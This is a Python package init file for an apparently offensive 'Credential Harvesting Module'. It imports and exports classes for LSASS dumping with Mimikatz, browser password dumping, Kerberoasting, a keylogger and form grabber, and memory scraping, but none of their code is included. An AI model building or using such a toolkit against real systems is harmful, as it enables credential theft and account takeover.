"""
Credential Harvesting Module - Comprehensive Credential Extraction

Components:
- credential_manager.py: Central credential storage and management
- mimikatz_automation.py: LSASS dumping and Kerberos attacks
- browser_dumper.py: Browser password extraction (Chrome, Firefox, Edge, etc.)
- kerberos_harvester.py: Kerberoasting, AS-REP roasting, ticket attacks
- keylogger.py: Cross-platform keystroke capture
- memory_scraper.py: Process memory scanning for credentials
"""

from .credential_manager import CredentialManager, Credential, CredentialHarvester
from .mimikatz_automation import MimikatzAutomation, LaZagneAutomation
from .browser_dumper import BrowserPasswordDumper
from .kerberos_harvester import KerberosHarvester
from .keylogger import Keylogger, FormGrabber
from .memory_scraper import MemoryScraper

__all__ = [
    'CredentialManager',
    'Credential',
    'CredentialHarvester',
    'MimikatzAutomation',
    'LaZagneAutomation',
    'BrowserPasswordDumper',
    'KerberosHarvester',
    'Keylogger',
    'FormGrabber',
    'MemoryScraper'
]
